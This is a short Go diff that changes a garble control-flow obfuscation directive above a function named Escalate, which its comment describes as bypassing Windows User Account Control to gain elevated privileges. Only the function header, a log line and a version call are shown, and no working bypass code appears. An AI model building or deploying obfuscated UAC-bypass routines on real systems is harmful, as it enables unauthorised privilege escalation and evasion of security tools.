@@ -12,7 +12,7 @@ import (
 
 // Uacbypass bypasses User Account Control of Windows and escaletes
 // privileges to root if User has root privileges
-//garble:controlflow flatten_passes=max junk_jumps=max block_splits=max flatten_hardening=xor,delegate_table
+//garble:controlflow  junk_jumps=8 flatten_hardening=xor
 func Escalate(path string) (err error) {
 	log.Println("Path for bypass: (", path, ")")
 	version, err := GetVer()
